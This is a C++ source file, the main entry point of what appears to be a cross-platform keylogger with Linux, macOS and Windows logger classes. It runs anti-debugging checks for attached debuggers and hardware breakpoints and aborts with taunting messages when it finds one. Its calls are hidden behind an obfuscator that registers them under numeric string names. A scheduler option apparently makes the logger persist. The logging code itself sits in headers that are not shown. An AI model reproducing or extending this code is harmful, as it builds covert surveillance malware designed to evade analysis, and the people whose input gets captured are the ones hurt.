#include "../include/linuxLogger.h"
#include "../include/macOsLogger.h"
#include "../include/windowsLogger.h"
#include "../include/scheduler.h"
#include "../include/antiDebug.h"
#include "../include/obfuscator.h"


/**
 * @brief This is the main entry point for the application.
 * @param argc -> The number of arguments.
 * @param argv -> The arguments.
 * @return int, 0 if the application ran successfully.
 */
int main(int argc, const char *argv[])
{
    AntiDebug ad;
    Obfuscator ob;

    ob.registerMethod<bool>("01110", [&ad]() { return ad.isDebuggerPresent(); });
    if (ob.callMethod<bool>("01110"))
    {
        throw std::runtime_error("Debugger detected. Don't do this... :)");
    }

    ob.registerMethod<bool>("0123", [&ad]() { return ad.checkForHardwareBreakpoints(); });
    if (ob.callMethod<bool>("0123"))
    {
        throw std::runtime_error("Hardware breakpoints detected. Don't do this... :)");
    }

    bool scheduleLogger = false;

    if (argc > 1)
    {
        for (int i = 0; i < argc; i++)
        {
            if (strcmp(argv[i], "--sd") == 0)
            {
                scheduleLogger = true;
                break;
            }
        }

        Scheduler scheduler;
        ob.registerMethod("0000", [&scheduler, scheduleLogger]() { scheduler.start(scheduleLogger); });
        ob.callMethod("0000");
    }
    else
    {
    #if defined(__linux__)
        LinuxLogger logger;
        ob.registerMethod("13123122", [&logger]() {logger.startLogging(); });
        ob.callMethod("13123122");
    #elif defined(__APPLE__)
        MacOsLogger logger;
        ob.registerMethod("13123122", [&logger]() {logger.startLogging(); });
        ob.callMethod("13123122");
    #elif defined(_WIN32) || defined(_WIN64)
        WindowsLogger logger;
        ob.registerMethod("13123122", [&logger]() { logger.startLogging(); });
        ob.callMethod("13123122");
    #endif
    }
}